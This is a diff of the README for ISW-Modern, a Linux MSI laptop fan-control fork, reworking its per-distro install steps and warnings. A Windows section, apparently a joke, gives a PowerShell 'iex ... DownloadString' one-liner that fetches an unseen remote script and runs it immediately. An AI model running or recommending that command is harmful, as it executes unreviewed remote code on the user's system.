@@ -3,28 +3,30 @@
    
 A modern fork of https://github.com/YoyPa/isw with some improvements.   
 Many thanks to [BeardOverflow](https://github.com/BeardOverflow), [Sayafdine Said](https://github.com/musikid), [Maxim Marshev](https://github.com/marshevms) and [Benjamin Abendroth](https://github.com/braph) for their awesome work.
-   
-- Note: This fork is no longer maintained.
+
+> [!IMPORTANT]
+> This fork is no longer maintained.
+
 - [Project Status Updates](https://github.com/FaridZelli/ISW-Modern/discussions/11)
 - [Alternatives](https://github.com/YoyPa/isw/issues/263)
    
 ---
    
-- **Installation on Debian / Ubuntu based distros:**   
-> Disable Secure Boot   
-> Uninstall any existing versions of ISW   
-> Open a terminal in your home directory and enter the following commands:   
+## Installation on Debian / Ubuntu based distros:
+1. Disable Secure Boot   
+2. Uninstall any existing versions of ISW   
+3. Open a terminal in your home directory and enter the following commands:   
 ```
 sudo apt update && apt upgrade
 sudo apt install dkms build-essential linux-headers-$(uname -r)
 ```
-> Reboot, and again:   
+4. Reboot, and again:   
 ```
 git clone https://github.com/musikid/acpi_ec.git
 cd acpi_ec
 sudo ./install.sh
 ```
-> Reboot one last time, and finally enter:   
+5. Reboot one last time, and finally enter:   
 ```
 git clone https://github.com/FaridZelli/ISW-Modern.git
 cd ISW-Modern
@@ -32,13 +34,11 @@ sudo bash ./install.sh
 sudo systemctl enable --now isw@SILENT.service
 ```
    
----
-   
-- **(Alternative) Debian package:**   
-> Disable Secure Boot   
-> Uninstall any existing versions of ISW and reboot   
-> Download the [Debian Package](https://github.com/FaridZelli/ISW-Modern/releases/download/M-1.0/ISW-Modern_M-1.0_amd64.deb)   
-> Open a terminal in the same directory and enter the following commands as sudo or root:
+### (Alternative) Debian package:
+1. Disable Secure Boot   
+2. Uninstall any existing versions of ISW and reboot   
+3. Download the [Debian Package](https://github.com/FaridZelli/ISW-Modern/releases/download/M-1.0/ISW-Modern_M-1.0_amd64.deb)   
+4. Open a terminal in the same directory and enter the following commands as sudo or root:
 ```
 sudo apt install ./ISW-Modern*.deb
 sudo systemctl enable --now isw@SILENT.service
@@ -46,21 +46,21 @@ sudo systemctl enable --now isw@SILENT.service
    
 ---
    
-- **Installation on Arch based distros:**   
-> Disable Secure Boot (It's unlikely to be enabled anyways)   
-> Uninstall any existing versions of ISW   
-> Open a terminal in your home directory and enter the following commands:   
+## Installation on Arch based distros:
+1. Disable Secure Boot (It's unlikely to be enabled anyways)   
+2. Uninstall any existing versions of ISW   
+3. Open a terminal in your home directory and enter the following commands:   
 ```
 sudo pacman -Syu
 sudo pacman -S linux-headers dkms
 ```
-> Reboot, and again:   
+4. Reboot, and again:   
 ```
 git clone https://github.com/musikid/acpi_ec.git
 cd acpi_ec
 sudo ./install.sh
 ```
-> Reboot one last time, and finally enter:   
+5. Reboot one last time, and finally enter:   
 ```
 git clone https://github.com/FaridZelli/ISW-Modern.git
 cd ISW-Modern
@@ -70,21 +70,21 @@ sudo systemctl enable --now isw@SILENT.service
    
 ---
    
-- **Installation on Fedora / CentOS / RHEL based distros:**   
-> Disable Secure Boot   
-> Uninstall any existing versions of ISW   
-> Open a terminal in your home directory and enter the following commands:   
+## Installation on Fedora / CentOS / RHEL based distros:
+1. Disable Secure Boot   
+2. Uninstall any existing versions of ISW   
+3. Open a terminal in your home directory and enter the following commands:   
 ```
 sudo dnf upgrade
 sudo dnf install kernel-devel dkms make openssl
 ```
-> Reboot, and again:   
+4. Reboot, and again:   
 ```
 git clone https://github.com/musikid/acpi_ec.git
 cd acpi_ec
 sudo ./install.sh
 ```
-> Reboot one last time, and finally enter:   
+5. Reboot one last time, and finally enter:   
 ```
 git clone https://github.com/FaridZelli/ISW-Modern.git
 cd ISW-Modern
@@ -94,13 +94,13 @@ sudo systemctl enable --now isw@SILENT.service
    
 ---
    
-- **Installation on all distros:**   
-> Disable Secure Boot   
-> Update your distro to the latest version   
-> Uninstall any existing versions of ISW and reboot   
-> Install [Sayafdine Said's acpi_ec Module](https://github.com/musikid/acpi_ec)   
-> Reboot again   
-> Open a terminal in your home directory and enter the following commands:   
+## Installation on all distros:
+1. Disable Secure Boot   
+2. Update your distro to the latest version   
+3. Uninstall any existing versions of ISW and reboot   
+4. Install [Sayafdine Said's acpi_ec Module](https://github.com/musikid/acpi_ec)   
+5. Reboot again   
+6. Open a terminal in your home directory and enter the following commands:   
 ```
 git clone https://github.com/FaridZelli/ISW-Modern.git
 cd ISW-Modern
@@ -110,15 +110,20 @@ sudo systemctl enable --now isw@SILENT.service
    
 ---
    
-- **Installation on Windows 10 / 11:**   
-> Download 420GB of RAM   
-> Open PowerShell (Windows + R powershell.exe)   
-> Enter the following command:   
+<details>
+<summary>Installation on Windows 10 / 11:</summary>
+   
+1. Open PowerShell (Windows + R powershell.exe)   
+   
+2. Enter the following command:   
+   
 ```
 iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/FaridZelli/-/main/source/script.ps1")
 ```
-> Remove MSI's bloatware from your laptop and install [Silent Option](https://forum-en.msi.com/index.php?threads/updated-2016-05-06-silent-option-fan-control-application-for-msi-laptops.255972/).
    
+3. Remove MSI's bloatware from your laptop and install [Silent Option](https://forum-en.msi.com/index.php?threads/updated-2016-05-06-silent-option-fan-control-application-for-msi-laptops.255972/).
+</details>
+
 ---
    
 Your fans should turn off. To use a custom profile, refer to instructions over at [the original repository](https://github.com/YoyPa/isw). In the unlikely event where neither of these approaches work for your device, try to piece it togeather using the original instructions.
@@ -137,14 +142,10 @@ Your fans should turn off. To use a custom profile, refer to instructions over a
 **A:** Apparently yes, it's been unmaintained since 2020 and has recently become unusable due to the ```ec_sys``` kernel module dependency which has been missing on many distros lately. YoyPa hasn't mentioned any plans regarding future development on ISW either. Check out [MLFC](https://github.com/marshevms/mlfc), an awesome alternative under development.
 
 - **Q:** My laptop exploded!   
-**A:** That's on you man.   
-- **WARNING:**   
-**This is not a joke, in fact, it is theoretically possible to blow up your laptop by directly writing to the EC.**   
-   
-## To do:
-- Switch to [msi-ec](https://github.com/BeardOverflow/msi-ec)
-- Cleanup isw.conf and add Katana address profile (as per issues [#1](https://github.com/FaridZelli/ISW-Modern/issues/1) & [#2](https://github.com/FaridZelli/ISW-Modern/issues/2))
-> - Actually complete the tasks stated above... or not (I'M LAZY)
+**A:** That's on you man.
+  
+> [!CAUTION]
+> **This is not a joke, in fact, it is theoretically possible to blow up your laptop by directly writing to the EC.**  
    
 ## Useful resources:
 - https://github.com/YoyPa/isw/issues/263
